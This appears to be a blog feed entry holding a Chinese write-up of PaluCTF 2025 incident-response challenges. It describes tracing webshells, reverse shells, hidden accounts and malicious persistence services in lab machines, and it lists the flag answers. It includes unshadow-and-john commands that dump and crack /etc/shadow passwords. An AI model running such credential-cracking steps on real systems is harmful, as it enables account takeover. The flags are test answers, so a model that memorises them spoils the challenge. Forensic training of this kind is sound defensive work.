<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PaluCTF 2025 应急响应 Writeup</title>
      <link href="/blog/2025/05/21/CTF-WP/PaluCTF%202025/"/>
      <url>/blog/2025/05/21/CTF-WP/PaluCTF%202025/</url>
      
        <content type="html"><![CDATA[<h2 id="solar-Linux后门排查（复现）"><a href="#solar-Linux后门排查（复现）" class="headerlink" title="solar_Linux后门排查（复现）"></a>solar_Linux后门排查（复现）</h2><p>题目描述</p><p>跳板机疑似被遗留后门,请排查<br>1、找到可疑进程完整路径<br>2、找到被横向的服务器IP<br>3、连接被横向服务器<br>flag格式为 flag{base64{完整路径}|服务器IP|服务器中flag文本}<br>root:Solar@2025_05_palu!</p><p><code>palu&#123;L3Vzci9saWIvc3lzdGVtZC9zeXN0ZW1kLWxvZ2lu|49.232.112.164|ZX0001S&#125;</code></p><p>连接服务器执行<code>ss</code>就能看到恶意IP<code>49.232.112.164</code>根据进程找到绝对路径</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-0.png"></p><p>进程为<code>/usr/lib/systemd/systemd-login</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-1.png"></p><p>最后ssh连上去即可获得flag<code>ZX0001S</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-2.png"></p><h2 id="应急响应-畸形的爱"><a href="#应急响应-畸形的爱" class="headerlink" title="应急响应 - 畸形的爱"></a>应急响应 - 畸形的爱</h2><p>官方附件密码<code>Parloo&amp;zgsfsys&amp;onefox&amp;solar**juyt</code></p><p><a href="https://www.yuque.com/attachments/yuque/0/2025/pdf/29320229/1747636530982-bb9a643f-55e7-450d-a6a3-3f2708c61090.pdf">应急响应之畸形的爱.pdf</a></p><p>做这题的注意事项：<br>1、虚拟机解压后是挂起状态，不要重启，否则可能会解不出个别题目</p><p>2、要把Webserver中的IP手动改为<code>192.168.87.101</code>，否则会出现docker容器无法启动的问题</p><h3 id="应急响应1-1-提交攻击者使用的攻击ip地址1"><a href="#应急响应1-1-提交攻击者使用的攻击ip地址1" class="headerlink" title="应急响应1-1 提交攻击者使用的攻击ip地址1"></a>应急响应1-1 提交攻击者使用的攻击ip地址1</h3><p><code>palu&#123;192.168.31.240&#125;</code></p><p>首先，在<code>/var/www/html</code>目录下可以看到一个木马<code>a.php</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-3.png"></p><p>所以黑客肯定连上过这个webshell，直接去翻看<code>/var/log/nginx/accexs.log.1</code>的日志可以找到第一个攻击IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> access.log.1 | grep <span class="string">&quot;a.php&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/5/21/image-4.png"></p><h3 id="应急响应1-2-提交攻击者使用的攻击ip地址2"><a href="#应急响应1-2-提交攻击者使用的攻击ip地址2" class="headerlink" title="应急响应1-2 提交攻击者使用的攻击ip地址2"></a>应急响应1-2 提交攻击者使用的攻击ip地址2</h3><p><code>palu&#123;192.168.31.11&#125;</code></p><p>要从虚拟机挂起状态启动webserver才能在网络连接状态里面看到第二个攻击者的IP</p><p>这里实际是一堆反弹shell在回连<code>192.168.31.11</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anotp</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/5/21/image-5.png"></p><p>另外一种思路：</p><p>如果无法打开挂起状态可以在docker容器中可以看到一个<code>clean.sh</code></p><p>里面就是反弹shell的命令，地址就是<code>192.168.31.11</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-6.png"></p><h3 id="应急响应1-3（复现）题解攻击者暴力破解开始时间"><a href="#应急响应1-3（复现）题解攻击者暴力破解开始时间" class="headerlink" title="应急响应1-3（复现）题解攻击者暴力破解开始时间"></a>应急响应1-3（复现）题解攻击者暴力破解开始时间</h3><p><code>palu&#123;2025:03:05:58&#125;</code></p><p>通过查找docker中的phpmyadmin的运行日志可以看到在<code>2025:03:05:58</code>开始，有大量的POST登录请求</p><p>这大量的请求就是登录爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs 680</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/5/21/image-7.png"></p><h3 id="应急响应1-4-提交攻击者留下的flag1"><a href="#应急响应1-4-提交攻击者留下的flag1" class="headerlink" title="应急响应1-4   提交攻击者留下的flag1"></a>应急响应1-4   提交攻击者留下的flag1</h3><p><code>palu&#123;pc3_zgsfqwerlkssaw&#125;</code></p><p>打开<code>Win10 PC-2</code>的任务计划程序即可看到flag1</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-8.png"></p><h3 id="应急响应1-5-提交攻击者留下的flag2"><a href="#应急响应1-5-提交攻击者留下的flag2" class="headerlink" title="应急响应1-5 提交攻击者留下的flag2"></a>应急响应1-5 提交攻击者留下的flag2</h3><p><code>palu&#123;nizhidaowoyouduoainima&#125;</code></p><p>点击flag1计划任务里面的操作，可以看到指向了一个<code>a.bat</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-9.png"></p><p>打开就能看到flag</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-10.png"></p><h3 id="应急响应1-6-提交攻击者留下的flag3"><a href="#应急响应1-6-提交攻击者留下的flag3" class="headerlink" title="应急响应1-6 提交攻击者留下的flag3"></a>应急响应1-6 提交攻击者留下的flag3</h3><p><code>palu&#123;sqlaabbccsbwindows&#125;</code></p><p>先在Webserver服务器中查看数据库连接密码，然后再进入Mysql虚拟机查看数据库详情</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-11.png"></p><p>进入数据库中可以看到一个1066订单，里面数据其实就是Base64编码而已</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-12.png"></p><p>或者在订单查询系统输入<code>ORD-2023-1066</code>也可以看到flag</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-13.png"></p><h3 id="应急响应1-7-提交钓鱼文件的哈希32位大写"><a href="#应急响应1-7-提交钓鱼文件的哈希32位大写" class="headerlink" title="应急响应1-7 提交钓鱼文件的哈希32位大写"></a>应急响应1-7 提交钓鱼文件的哈希32位大写</h3><p><code>palu&#123;2977CDAB8F3EE5EFDDAE61AD9F6CF203&#125;</code></p><p>查看内网通里面的聊天记录可以知道，王美欣是被钓鱼的用户</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-14.png"></p><p>简历.zip解压后是一个简历.exe文件</p><p>扔微步云沙箱就能知道这个文件就是钓鱼文件</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-15.png"></p><h3 id="应急响应1-8（复现）提交攻击者留下的webshell-1密码"><a href="#应急响应1-8（复现）提交攻击者留下的webshell-1密码" class="headerlink" title="应急响应1-8（复现）提交攻击者留下的webshell-1密码"></a>应急响应1-8（复现）提交攻击者留下的webshell-1密码</h3><p><code>palu&#123;hack&#125;</code></p><p>在Webserver的docker容器ec87eb8a81c7里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it ec87eb8a81c7 /bin/sh</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/5/21/image-16.png"></p><h3 id="应急响应1-9（复现）提交攻击者开放端口"><a href="#应急响应1-9（复现）提交攻击者开放端口" class="headerlink" title="应急响应1-9（复现）提交攻击者开放端口"></a>应急响应1-9（复现）提交攻击者开放端口</h3><p><code>palu&#123;1133,1144,8084&#125;</code></p><p>在Webserver中的定时任务找到了第一个开放端口（如果重启了虚拟机就看不到这个文件）</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-17.png"></p><p>在docker内的clear.sh也可以看到第二个端口</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-18.png"></p><p>在<code>Win10 PC2</code>的网络连接状态中找到了第三个端口（如果重启了虚拟机就看不到这个网络连接状态）</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-19.png"></p><h3 id="应急响应1-10-提交攻击者留下的webshell密码2"><a href="#应急响应1-10-提交攻击者留下的webshell密码2" class="headerlink" title="应急响应1-10 提交攻击者留下的webshell密码2"></a>应急响应1-10 提交攻击者留下的webshell密码2</h3><p><code>palu&#123;00232&#125;</code></p><p>在Webserver中的<code>a.php</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-20.png"></p><h3 id="应急响应1-11-提交攻击者留下的隐藏账户的密码"><a href="#应急响应1-11-提交攻击者留下的隐藏账户的密码" class="headerlink" title="应急响应1-11 提交攻击者留下的隐藏账户的密码"></a>应急响应1-11 提交攻击者留下的隐藏账户的密码</h3><p><code>palu&#123;wmx_love&#125;</code></p><p> 在计算机管理中可以找到名为<code>system$</code>的隐藏账号</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-21.png"></p><p>使用<code>proactive system password recovery</code>查看用户密码hash</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-22.png"></p><p>然后放到cmd5解密（要钱）</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-23.jpeg"></p><h3 id="应急响应1-12（复现）溯源攻击者的邮箱"><a href="#应急响应1-12（复现）溯源攻击者的邮箱" class="headerlink" title="应急响应1-12（复现）溯源攻击者的邮箱"></a>应急响应1-12（复现）溯源攻击者的邮箱</h3><p><code>palu&#123;n0k4u@outlook.com&#125;</code></p><p>用IDA看<code>简历.exe</code>重可以看到一个特殊的用户名<code>n0k4u</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-24.png"></p><p>直接搜这个名字可以看到一个Github项目</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-25.png"></p><p>用GitHub的接口反查邮箱<code>https://api.github.com/users/&lt;用户名&gt;/events/public</code></p><p><a href="https://api.github.com/users/n0k4u/events/public">https://api.github.com/users/n0k4u/events/public</a></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-26.png"></p><h3 id="应急响应1-13（复现）提交溯源后得到的flag"><a href="#应急响应1-13（复现）提交溯源后得到的flag" class="headerlink" title="应急响应1-13（复现）提交溯源后得到的flag"></a>应急响应1-13（复现）提交溯源后得到的flag</h3><p><code>palu&#123;loveyouibiejv&#125;</code></p><p>进入他的GitHub可以看到一个项目</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-27.png"></p><p>查看历史提交信息</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-28.png"></p><p>发现一个疑似QQ号</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-29.png"></p><p>flag在添加好友处</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-30.png"></p><h2 id="应急响应主线"><a href="#应急响应主线" class="headerlink" title="应急响应主线"></a>应急响应主线</h2><p>官方附件解压密码<code>Skills@@@Skills@@@Skills</code></p><p><a href="https://www.yuque.com/attachments/yuque/0/2025/pdf/29320229/1747720192499-99d0591e-50fc-45f0-9c22-7fa502694a1b.pdf">第二届“Parloo”CTF应急响应挑战赛应急响应场景挑战说明手册.pdf</a></p><h3 id="应急响应2-1-提交堡垒机中留下的flag"><a href="#应急响应2-1-提交堡垒机中留下的flag" class="headerlink" title="应急响应2-1 提交堡垒机中留下的flag"></a>应急响应2-1 提交堡垒机中留下的flag</h3><p><code>palu&#123;2025_qiandao_flag&#125;</code></p><p>登录堡垒机，在标签列表处就能看到flag</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-31.png"></p><h3 id="应急响应2-2-提交WAF中隐藏的flag"><a href="#应急响应2-2-提交WAF中隐藏的flag" class="headerlink" title="应急响应2-2 提交WAF中隐藏的flag"></a>应急响应2-2 提交WAF中隐藏的flag</h3><p><code>palu&#123;2025_waf&#125;</code></p><p>点击身份验证-配置就能看到flag</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-32.png"></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-33.png"></p><h3 id="应急响应2-3-提交Mysql中留下的flag"><a href="#应急响应2-3-提交Mysql中留下的flag" class="headerlink" title="应急响应2-3 提交Mysql中留下的flag"></a>应急响应2-3 提交Mysql中留下的flag</h3><p><code>palu&#123;Mysql_@2025&#125;</code></p><p>我直接在server01的1Panel面板上装了个phpMyAdmin进行分析，连接信息如下</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-34.png"></p><p>登录进去后就能看到flag</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-35.png"></p><h3 id="应急响应2-4-提交攻击者的攻击IP"><a href="#应急响应2-4-提交攻击者的攻击IP" class="headerlink" title="应急响应2-4 提交攻击者的攻击IP"></a>应急响应2-4 提交攻击者的攻击IP</h3><p><code>palu&#123;192.168.20.107&#125;</code></p><p>这个很容易找，就在WAF日志中就能看到攻击者是<code>192.168.20.107</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-36.png"></p><p>提一嘴，雷池WAF默认访问日志位置在<code>/data/safeline/logs/nginx/safeline</code></p><p>如果没专业版想导出日志看的可以在这个位置找到</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-37.png">  </p><h3 id="应急响应2-5-提交攻攻击者最早攻击时间"><a href="#应急响应2-5-提交攻攻击者最早攻击时间" class="headerlink" title="应急响应2-5 提交攻攻击者最早攻击时间"></a>应急响应2-5 提交攻攻击者最早攻击时间</h3><p><code>palu&#123;2025-05-05-00:04:40&#125;</code></p><p>攻击最早时间就在右边（这题一开始被官方给的错误格式坑了）</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-38.png"></p><p><font style="color:rgb(238, 238, 238);"></font></p><h3 id="应急响应2-6-提交web服务泄露的关键文件名"><a href="#应急响应2-6-提交web服务泄露的关键文件名" class="headerlink" title="应急响应2-6 提交web服务泄露的关键文件名"></a>应急响应2-6 提交web服务泄露的关键文件名</h3><p><code>palu&#123;key.txt&#125;</code></p><p>在WAF中的web服务里可以看到一个<code>key.txt</code>他就是泄露的文件</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-39.png"></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-40.png"></p><h3 id="应急响应2-7-题解泄露的邮箱地址"><a href="#应急响应2-7-题解泄露的邮箱地址" class="headerlink" title="应急响应2-7 题解泄露的邮箱地址"></a>应急响应2-7 题解泄露的邮箱地址</h3><p><code>palu&#123;parloo@parloo.com&#125;</code></p><p>key.txt文件一直向右拉就可以看到一个邮箱</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/29320229/1747452397873-719c8840-045c-4b9c-8eb1-a264b41e0a64.png"><font style="color:rgb(238, 238, 238);"><br></font></p><h3 id="应急响应2-8-提交立足点服务器ip地址"><a href="#应急响应2-8-提交立足点服务器ip地址" class="headerlink" title="应急响应2-8 提交立足点服务器ip地址"></a>应急响应2-8 提交立足点服务器ip地址</h3><p><code>palu&#123;192.168.20.108&#125;</code></p><p>在WAF中看到了有从<code>SSH Server</code>运维机出来的攻击流量，猜测立足点就是 <code>192.168.20.108</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-42.png"></p><h3 id="应急响应2-9-提交攻击者使用的提权的用户和密码"><a href="#应急响应2-9-提交攻击者使用的提权的用户和密码" class="headerlink" title="应急响应2-9 提交攻击者使用的提权的用户和密码"></a>应急响应2-9 提交攻击者使用的提权的用户和密码</h3><p><code>palu&#123;parloo/parloo&#125;</code></p><p>既然知道了攻击者立足点为192.168.20.108所以直接来看SSH Server里面是否有疑似账号就行了</p><p>这机子感觉做了什么手脚，SSH无法连且登录进去要很久，只要输入完账号密码后按<code>Ctrl+C</code>就可以快速进入</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-43.png"></p><p>先将/etc/passwd文件和/etc/shadow文件合并成一个.txt文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unshadow /etc/passwd /etc/shadow &gt; 1.txt</span><br></pre></td></tr></table></figure><p>然后在ssh里面开了一个python服务把文件放到了另一台机子用john跑parloo账号的密码</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-44.png"></p><h3 id="应急响应2-10-提交攻击者留下的的文件内容作为flag提交"><a href="#应急响应2-10-提交攻击者留下的的文件内容作为flag提交" class="headerlink" title="应急响应2-10  提交攻击者留下的的文件内容作为flag提交"></a>应急响应2-10  提交攻击者留下的的文件内容作为flag提交</h3><p><code>palu&#123;hi_2025_parloo_is_hack&#125;</code></p><p>就在parloo用户的家目录里面</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-45.png"></p><h3 id="应急响应2-11（复现）提交权限维持方法服务的名称"><a href="#应急响应2-11（复现）提交权限维持方法服务的名称" class="headerlink" title="应急响应2-11（复现）提交权限维持方法服务的名称"></a>应急响应2-11（复现）提交权限维持方法服务的名称</h3><p><code>palu&#123;rootset&#125;</code></p><p>运行以下命令可以看到两个可疑的运行中的服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-units --<span class="built_in">type</span>=service </span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/5/21/image-46.png"></p><p>查看服务运行状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl status rootset.service</span><br><span class="line">systemctl status rootset-test.service</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/5/21/image-47.png"></p><p>两个服务都指向了一个文件<code>/usr/bin/b4b40c44ws</code></p><p>开个python的http服务下载下来扔微步云沙箱发现是木马</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-48.png"></p><p>所以就能猜测是权限维持服务</p><h3 id="应急响应2-12-提交攻击者攻击恶意服务器连接地址作为flag提交"><a href="#应急响应2-12-提交攻击者攻击恶意服务器连接地址作为flag提交" class="headerlink" title="应急响应2-12 提交攻击者攻击恶意服务器连接地址作为flag提交"></a>应急响应2-12 提交攻击者攻击恶意服务器连接地址作为flag提交</h3><p><code>palu&#123;47.101.213.153&#125;</code></p><p>把<code>b4b40c44ws</code>扔进IDA查看即可看到服务器恶意连接地址</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-49.png"></p><h3 id="应急响应2-13（复现）找到系统中被劫持的程序程序名作为flag提交"><a href="#应急响应2-13（复现）找到系统中被劫持的程序程序名作为flag提交" class="headerlink" title="应急响应2-13（复现）找到系统中被劫持的程序程序名作为flag提交"></a>应急响应2-13（复现）找到系统中被劫持的程序程序名作为flag提交</h3><p><code>palu&#123;id&#125;</code></p><p>首先查看一下权限维持木马的创建时间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stat</span> b4b40c44ws</span><br></pre></td></tr></table></figure><p>然后根据这个时间查看5月7号当天被修改的文件就能看到<code>id</code>这个一起被修改的程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /usr -<span class="built_in">type</span> f -nawermt <span class="string">&quot;2025-05-7&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/5/21/image-50.png"></p><h3 id="应急响应2-14-找到系统中存在信息泄露的服务运行端口作为flag提交"><a href="#应急响应2-14-找到系统中存在信息泄露的服务运行端口作为flag提交" class="headerlink" title="应急响应2-14 找到系统中存在信息泄露的服务运行端口作为flag提交"></a>应急响应2-14 找到系统中存在信息泄露的服务运行端口作为flag提交</h3><p><code>palu&#123;8081&#125;</code></p><p>打开Server01的1Panel面板可以看到有两个站点</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-51.png"></p><p>其中第一个站点是一个员工档案管理</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-52.png"></p><p>查看页面源码可以发现泄露了敏感信息，所以就是8081端口</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-53.png"></p><h3 id="应急响应2-15-提交Parloo公司项目经理的身份证号作为flag提交"><a href="#应急响应2-15-提交Parloo公司项目经理的身份证号作为flag提交" class="headerlink" title="应急响应2-15 提交Parloo公司项目经理的身份证号作为flag提交"></a>应急响应2-15 提交Parloo公司项目经理的身份证号作为flag提交</h3><p><code>palu&#123;310105198512123456&#125;</code><br>在上一题的页面源码就能看到相关身份证信息</p><h3 id="应急响应2-16（复现）提交存在危险功能的操作系统路径作为flag提交"><a href="#应急响应2-16（复现）提交存在危险功能的操作系统路径作为flag提交" class="headerlink" title="应急响应2-16（复现）提交存在危险功能的操作系统路径作为flag提交"></a>应急响应2-16（复现）提交存在危险功能的操作系统路径作为flag提交</h3><p><code>palu&#123;/admin/parloo&#125;</code></p><p>这题估计得看完gitea里面留下的维护页文件后才能大致知道思路，管理员在服务器上开了一个维护页面</p><p>进容器执行以下命令更改admin的密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it 224d7f8df25c /bin/bash</span><br><span class="line">su git</span><br><span class="line"><span class="built_in">cd</span> /app/gitea</span><br><span class="line">./gitea admin user change-password --username admin --password admin123</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/5/21/image-54.png"></p><p>然后登录gitea就能看到在仓库放的维护页面源码</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-55.png"></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-56.png"></p><p>当时是真没想到这个页面开在了server服务器里，端口为8080（当时就疑惑这个页面开放在哪里）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -lanp</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/5/21/image-57.png"></p><p>而且可以执行恶意命令，所以flag就是<code>/admin/parloo</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-58.png"></p><h3 id="应急响应2-17（复现）提交进源机器中恶意程序的MD5作为flag进行提交"><a href="#应急响应2-17（复现）提交进源机器中恶意程序的MD5作为flag进行提交" class="headerlink" title="应急响应2-17（复现）提交进源机器中恶意程序的MD5作为flag进行提交"></a>应急响应2-17（复现）提交进源机器中恶意程序的MD5作为flag进行提交</h3><p><code>palu&#123;0f80a82621b8c4c3303d198d13776b34&#125;</code></p><p>被近源机器03一开机就会有个程序报错，而且放的位置很难不引起怀疑（当时我没怀疑这个报错亲手关了 Dogs）</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-59.png"></p><p>扔沙箱之后就能发现是恶意程序了</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-60.png"></p><p>但是答案不对，最后在临时目录下看见另一个svhost.exe文件，文件大小不一样，扔沙箱还是显示木马</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-61.png"></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-62.png"></p><h3 id="应急响应2-18-提交攻击者留下的恶意账户名称md5后作为flag进行提交"><a href="#应急响应2-18-提交攻击者留下的恶意账户名称md5后作为flag进行提交" class="headerlink" title="应急响应2-18 提交攻击者留下的恶意账户名称md5后作为flag进行提交"></a>应急响应2-18 提交攻击者留下的恶意账户名称md5后作为flag进行提交</h3><p><code>palu&#123;d78b6f30225cdc811adfe8d4e7c9fd34&#125;</code></p><p>在进入被近源的机子系统前就可以看到多了一个hack账号</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-63.png"></p><h3 id="应急响应2-19-提交内部群中留下的flag并提交"><a href="#应急响应2-19-提交内部群中留下的flag并提交" class="headerlink" title="应急响应2-19 提交内部群中留下的flag并提交"></a>应急响应2-19 提交内部群中留下的flag并提交</h3><p><code>palu&#123;nbq_nbq_parloo&#125;</code></p><p>就在内网通的聊天记录里</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-64.png"></p><h3 id="应急响应2-20-请提交攻击者使用维护页面获取到的敏感内容作为flag进行提交"><a href="#应急响应2-20-请提交攻击者使用维护页面获取到的敏感内容作为flag进行提交" class="headerlink" title="应急响应2-20 请提交攻击者使用维护页面获取到的敏感内容作为flag进行提交"></a>应急响应2-20 请提交攻击者使用维护页面获取到的敏感内容作为flag进行提交</h3><p><code>palu&#123;Server_Parloo_2025&#125;</code></p><p>还记得gitea仓库里面的带有危险功能的页面吗，在源码中日志文件的名字为<code>command.log</code></p><p>所以直接全局搜这个文件即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&#x27;command.log&#x27;</span></span><br></pre></td></tr></table></figure><p>真正的日志文件就在<code>/var/log/parloo/command.log</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-65.png"></p><p>在631行中可以看到一个flag</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-66.png"></p><h3 id="应急响应2-21-提交获取敏感内容IP的第一次执行命令时间作为flag进行提交"><a href="#应急响应2-21-提交获取敏感内容IP的第一次执行命令时间作为flag进行提交" class="headerlink" title="应急响应2-21 提交获取敏感内容IP的第一次执行命令时间作为flag进行提交"></a>应急响应2-21 提交获取敏感内容IP的第一次执行命令时间作为flag进行提交</h3><p><code>palu&#123;2025-05-04:15:30:38&#125;</code></p><p>看日志第一行的时间就行<img src="https://img.beiko.top/blog/2025/5/21/image-67.png"></p><h3 id="应急响应2-22-提交攻击者使用的恶意ip和端口"><a href="#应急响应2-22-提交攻击者使用的恶意ip和端口" class="headerlink" title="应急响应2-22  提交攻击者使用的恶意ip和端口"></a>应急响应2-22  提交攻击者使用的恶意ip和端口</h3><p><code>palu&#123;10.12.12.13:9999&#125;</code></p><p>还是看日志文件就行</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-68.png"></p><h3 id="应急响应2-23（复现）提交重要数据的名文内容作为flag提交"><a href="#应急响应2-23（复现）提交重要数据的名文内容作为flag提交" class="headerlink" title="应急响应2-23（复现）提交重要数据的名文内容作为flag提交"></a>应急响应2-23（复现）提交重要数据的名文内容作为flag提交</h3><p><code>palu&#123;Password-000&#125;</code></p><p>在gitea仓库中是存有hack的一个加密脚本的</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-69.png"></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-70.png"></p><p>密文就在被近源机器03的桌面上</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-71.png"></p><p>因为没有密钥，所以是猜测明文开头为<code>palu&#123;</code>让AI进行逆向分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">def custom_encrypt(text, key):</span><br><span class="line">    encrypted = []</span><br><span class="line">    key_bytes = [ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> key]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> enumerate(text):</span><br><span class="line">        shifted = ord(char) + (i % 5 + 1)</span><br><span class="line"></span><br><span class="line">        xor_key = key_bytes[i % len(key_bytes)]</span><br><span class="line">        xored = shifted ^ xor_key</span><br><span class="line">        substituted = ((xored &amp; 0x0F) &lt;&lt; <span class="string">4) | ((xored &amp; 0xF0) &gt;&gt; 4</span>)</span><br><span class="line">        encrypted.append(f<span class="string">&quot;&#123;substituted:02x&#125;&quot;</span>)</span><br><span class="line">    <span class="built_in">return</span> <span class="string">&quot;&quot;</span>.<span class="built_in">join</span>(encrypted)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def custom_decrypt(encrypted_text, key):</span><br><span class="line">    decrypted = []</span><br><span class="line">    key_bytes = [ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> key]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Process the encrypted text two characters at a time (hex pairs)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(0, len(encrypted_text), 2):</span><br><span class="line">        <span class="comment"># Convert hex pair to integer</span></span><br><span class="line">        substituted = int(encrypted_text[i : i + 2], 16)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Reverse nibble swap</span></span><br><span class="line">        xored = ((substituted &amp; 0x0F) &lt;&lt; <span class="string">4) | ((substituted &amp; 0xF0) &gt;&gt; 4</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Reverse XOR with key</span></span><br><span class="line">        xor_key = key_bytes[i // 2 % len(key_bytes)]</span><br><span class="line">        shifted = xored ^ xor_key</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Reverse the position-based shift</span></span><br><span class="line">        char_code = shifted - ((i // 2 % 5) + 1)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Convert back to character</span></span><br><span class="line">        decrypted.append(chr(char_code))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> <span class="string">&quot;&quot;</span>.<span class="built_in">join</span>(decrypted)</span><br><span class="line"></span><br><span 